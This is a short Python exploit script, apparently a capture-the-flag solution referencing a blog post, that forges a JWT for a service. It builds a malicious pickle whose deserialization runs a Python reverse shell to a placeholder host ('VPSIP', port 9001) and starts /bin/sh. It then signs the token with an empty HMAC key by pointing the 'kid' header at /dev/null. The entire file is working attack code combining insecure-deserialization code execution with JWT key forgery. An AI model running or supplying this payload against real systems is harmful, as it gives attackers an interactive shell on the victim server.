#https://bycsec.top/2020/06/24/Make-jwt-great-again/

import pickle
import os
import base64
from hashlib import sha256
import hmac

class exp(object):
    def __reduce__(self):
        s = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VPSIP",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'   """
        return (os.system, (s,))

e = exp()
payload=base64.urlsafe_b64encode(pickle.dumps(e)).decode('utf-8')
#print(payload)

key = "".encode('utf-8')
data =("eyJraWQiOiIvZGV2L251bGwiLCJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."+payload).encode('utf-8')
#print(data)
signature = base64.urlsafe_b64encode(hmac.new(key,data,digestmod=sha256).digest())
#print(signature)
print(data.decode()+'.'+signature.decode().rstrip('='))